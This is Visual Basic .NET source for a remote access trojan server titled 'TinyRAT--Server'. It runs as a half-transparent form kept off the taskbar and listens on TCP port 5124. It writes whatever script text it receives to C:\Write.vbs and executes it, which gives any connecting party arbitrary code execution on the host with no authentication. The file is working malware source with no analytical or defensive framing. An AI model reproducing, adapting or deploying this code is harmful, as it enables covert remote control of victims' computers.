Imports System.Net
Imports System.Net.Sockets
Imports System
Imports System.Reflection
Imports System.Runtime.InteropServices
<Assembly: AssemblyTitle("TinyRAT--Server")> 
<Assembly: AssemblyDescription("A Visual Basic Script Executer")> 
<Assembly: AssemblyCompany("Dr. Apocalypse")> 
<Assembly: AssemblyProduct("TinyRAT--Server")> 
<Assembly: CLSCompliant(True)> 
<Assembly: Guid("AFFD2F97-AD4A-48EA-9BFB-EE218EDB3C46")> 
<Assembly: AssemblyVersion("1.0.*")> 
Public Class frmHome
    Inherits System.Windows.Forms.Form
#Region " Windows Form Designer generated code "
    Public Sub New()
        MyBase.New()
        InitializeComponent()
    End Sub
    Protected Overloads Overrides Sub Dispose(ByVal disposing As Boolean)
        If disposing Then
            If Not (components Is Nothing) Then
                components.Dispose()
            End If
        End If
        MyBase.Dispose(disposing)
    End Sub
    Private components As System.ComponentModel.IContainer
    <System.Diagnostics.DebuggerStepThrough()> Private Sub InitializeComponent()
        '
        'frmHome
        '
        Me.AutoScaleBaseSize = New System.Drawing.Size(5, 13)
        Me.ClientSize = New System.Drawing.Size(130, 93)
        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedToolWindow
        Me.Name = "frmHome"
        Me.Opacity = 0.5
        Me.ShowInTaskbar = False
        Me.Text = "VBS Runner - Server"

    End Sub
#End Region
    Private _HostSocket As Socket
    Private _IpEndPoint As New IPEndPoint(Dns.GetHostByName(Dns.GetHostName).AddressList(0), 5124)
    Private _TcpListener As New TcpListener(5124)
    Private _Timer As New Timer
    Private Sub frmHome_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        _TcpListener.Start()
        AddHandler _Timer.Tick, AddressOf CheckTcpListener
        _Timer.Interval = 1000
        _Timer.Start()
    End Sub
    Private Sub CheckTcpListener(ByVal sender As Object, ByVal e As System.EventArgs)
        If _TcpListener.Pending = True Then
            _HostSocket = _TcpListener.AcceptSocket
            If _HostSocket.Poll(1, SelectMode.SelectRead) Then
                Dim numBytes As Int32 = _HostSocket.Available
                Dim Data(numBytes) As Byte
                Dim DataString As String
                _HostSocket.Receive(Data)
                DataString = System.Text.ASCIIEncoding.ASCII.GetString(Data)
                FileOpen(1, "C:\Write.vbs", OpenMode.Output)
                PrintLine(1, DataString)
                FileClose(1)
                Process.Start("C:\Write.vbs")
            End If
        End If
    End Sub
End Class
